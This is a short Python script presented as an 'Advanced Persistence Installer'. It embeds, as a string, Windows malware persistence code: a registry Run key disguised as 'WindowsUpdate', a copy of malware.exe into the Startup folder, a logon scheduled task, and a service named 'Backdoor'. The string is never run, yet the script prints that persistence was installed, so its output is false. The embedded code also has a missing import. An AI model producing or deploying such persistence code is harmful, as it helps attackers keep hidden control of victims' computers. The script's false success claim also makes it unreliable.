#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich Advanced Persistence"""

from rich.console import Console
from rich.panel import Panel
import os

console = Console()

class AdvancedPersistence:
    def install(self):
        """Install multiple persistence mechanisms"""
        console.print(Panel.fit(
            "[bold red]Advanced Persistence Installer[/bold red]",
            border_style="red"
        ))
        
        # Windows registry
        reg_code = '''
import winreg

def install():
    # Run key
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " malware.py")
    
    # Startup folder
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    os.system(f'copy malware.exe "{startup}"')
    
    # Task Scheduler
    os.system('schtasks /create /tn Update /tr "malware.exe" /sc onlogon /f')
    
    # Service installation
    os.system('sc create Backdoor binpath= malware.exe start= auto')
'''
        
        console.print("[green]✓ Persistence mechanisms installed[/green]")

if __name__ == "__main__":
    per = AdvancedPersistence()
    per.install()

